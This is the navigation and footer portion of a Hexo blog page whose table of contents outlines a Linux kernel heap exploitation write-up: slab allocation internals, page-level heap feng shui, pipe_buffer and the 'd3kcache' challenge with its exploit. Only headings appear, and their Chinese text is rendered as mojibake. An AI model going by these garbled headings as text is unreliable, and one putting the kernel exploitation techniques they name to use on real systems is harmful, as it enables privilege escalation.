class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#slab-alloc-node%E5%87%BD%E6%95%B0"><span class="nav-text">__slab_alloc_nodeå‡½æ•°</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#alloc-single-from-new-slab%E5%87%BD%E6%95%B0"><span class="nav-text">alloc_single_from_new_slabå‡½æ•°</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#allocate-slab%E5%87%BD%E6%95%B0"><span class="nav-text">allocate_slabå‡½æ•°</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4%E6%9E%84%E9%80%A0"><span class="nav-text">é¡µçº§å †é£æ°´æ„é€ </span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E9%85%8D%E4%BB%BB%E6%84%8F%E6%95%B0%E9%87%8F%E4%BB%BB%E6%84%8F%E5%A4%A7%E5%B0%8Fpage"><span class="nav-text">åˆ†é…ä»»æ„æ•°é‡ä»»æ„å¤§å°page</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8A%E6%94%BE"><span class="nav-text">é‡Šæ”¾</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">æ€»ç»“</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pipe-buffer"><span class="nav-text">pipe_buffer</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pipe-buffer%E5%88%86%E9%85%8D%E8%BF%87%E7%A8%8B"><span class="nav-text">pipe_bufferåˆ†é…è¿‡ç¨‹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pipe-buffer%E4%BF%AE%E6%94%B9%E5%88%86%E9%85%8D%E5%A4%A7%E5%B0%8F"><span class="nav-text">pipe_bufferä¿®æ”¹åˆ†é…å¤§å°</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#d3kcache"><span class="nav-text">d3kcache</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A9%B1%E5%8A%A8%E5%88%86%E6%9E%90"><span class="nav-text">é©±åŠ¨åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">é¢„æœŸåˆ©ç”¨åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%E6%89%80%E8%BF%B0%EF%BC%8C%E5%8F%AF%E5%BE%97exp"><span class="nav-text">ç»¼ä¸Šæ‰€è¿°ï¼Œå¯å¾—exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E4%BA%BA%E5%BD%93%E6%97%B6%E5%81%9A%E7%9A%84%E7%AC%A8%E5%8A%9E%E6%B3%95"><span class="nav-text">æœ¬äººå½“æ—¶åšçš„ç¬¨åŠæ³•</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="copyright-info info-item">
        &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2024
        
            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">196082</a>
        
    </div>

    <div class="theme-info info-item">
        ç”±&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;é©±åŠ¨&nbsp;&&nbsp;ä¸»é¢˜&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
    </div>

    
        
        <div class="deploy-info info-item">
            
            æœ¬ç«™ç”± <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> æä¾›éƒ¨ç½²æœåŠ¡
            
        </div>
    

    
        <div class="count-info info-item">
            
                <span class="count-item border-box word">
                    <span class="item-type border-box">æ€»å­—æ•°</span>
                    <span class="item-value border-box word">335.6k</span>
                </span>
            

            
                <span class="count-item border-box uv">
                    <span class="item-type border-box">è®¿å®¢æ•°</span>
                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
                </span>
            

            
                <span class="count-item border-box pv">
                    <span class="item-type border-box">è®¿é—®é‡</span>
                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
                </span>
            
        </div>
    

    
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="post-tools-list border-box">
        <!-- PC encrypt again -->
        

        <!-- PC TOC show toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- PC go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        

        <!-- PC full screen -->
        <li class="tools-item flex-center full-screen">
            <i class="fa-solid fa-expand"></i>
        </li>
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <!-- toggle mode -->
        
            <li class="tools-item tool-toggle-theme-mode flex-center">
                <i class="fas fa-moon"></i>
            </li>
        

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        <!-- to bottom -->
        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        
            <li class="tools-item toggle-show-toc-tablet flex-center">
                <i class="fas fa-list"></i>
            </li>
        

        
            <li class="tools-item go-to-comments-tablet flex-center">
                <i class="fas fa-comment"></i>
            </li>
        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="æœç´¢..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

    <!-- tablet toc -->
    
        <div class="tablet-post-toc-mask">
            <div class="tablet-post-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">å‰è¨€</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#io-uring%E5%9C%A8%E5%A0%86%E5%96%B7%E4%B8%AD%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7"><span class="nav-text">io_uringåœ¨å †å–·ä¸­çš„å±€é™æ€§</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#slab%E5%88%86%E9%85%8D%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">slabåˆ†é…æºç åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#kmem-cache-create-usercopy%E6%B5%81%E7%A8%8B"><span class="nav-text">kmem_cache_create_usercopyæµç¨‹</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#calculate-sizes%E5%87%BD%E6%95%B0"><span class="nav-text">calculate_sizeså‡½æ•°</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calculate-order%E5%87%BD%E6%95%B0"><span class="nav-text">calculate_orderå‡½æ•°</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-slab-order%E5%87%BD%E6%95%B0"><span class="nav-text">calc_slab_orderå‡½æ•°</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kmem-cache-alloc%E6%B5%81%E7%A8%8B"><span class="nav-text">kmem_cache_allocæµç¨‹</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#slab-alloc-node%E5%87%BD%E6%95%B0"><span class="nav-text">__slab_alloc_nodeå‡½æ•°</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#alloc-single-from-new-slab%E5%87%BD%E6%95%B0"><span class="nav-text">alloc_single_from_new_slabå‡½æ•°</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#allocate-slab%E5%87%BD%E6%95%B0"><span class="nav-text">allocate_slabå‡½æ•°</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4%E6%9E%84%E9%80%A0"><span class="nav-text">é¡µçº§å †é£æ°´æ„é€ </span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E9%85%8D%E4%BB%BB%E6%84%8F%E6%95%B0%E9%87%8F%E4%BB%BB%E6%84%8F%E5%A4%A7%E5%B0%8Fpage"><span class="nav-text">åˆ†é…ä»»æ„æ•°é‡ä»»æ„å¤§å°page</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8A%E6%94%BE"><span class="nav-text">é‡Šæ”¾</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">æ€»ç»“</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pipe-buffer"><span class="nav-text">pipe_buffer</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pipe-buffer%E5%88%86%E9%85%8D%E8%BF%87%E7%A8%8B"><span class="nav-text">pipe_bufferåˆ†é…è¿‡ç¨‹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pipe-buffer%E4%BF%AE%E6%94%B9%E5%88%86%E9%85%8D%E5%A4%A7%E5%B0%8F"><span class="nav-text">pipe_bufferä¿®æ”¹åˆ†é…å¤§å°</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#d3kcache"><span class="nav-text">d3kcache</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A9%B1%E5%8A%A8%E5%88%86%E6%9E%90"><span class="nav-text">é©±åŠ¨åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">é¢„æœŸåˆ©ç”¨åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%E6%89%80%E8%BF%B0%EF%BC%8C%E5%8F%AF%E5%BE%97exp"><span class="nav-text">ç»¼ä¸Šæ‰€è¿°ï¼Œå¯å¾—exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E4%BA%BA%E5%BD%93%E6%97%B6%E5%81%9A%E7%9A%84%E7%AC%A8%E5%8A%9E%E6%B3%95"><span class="nav-text">æœ¬äººå½“æ—¶åšçš„ç¬¨åŠæ³•</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        </div>
    
</main>





<!-- common js -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/libs/anime.min.js"></script>

<!-- local search -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/local-search.min.js"></script>


<!-- lazyload -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/lazyload.min.js"></script>


<div class="">
    <!-- home page -->
    

    <!-- post page -->
    
        <!-- post-helper -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/post-helper.min.js"></script>

        <!-- toc -->
        
            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/toc.min.js"></script>
        

        <!-- copyright-info -->
        

        <!-- share -->
        
    

    <!-- categories page -->
    

    <!-- links page -->
    

    <!-- photos page -->
    

    <!-- tools page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



</body>
</html>
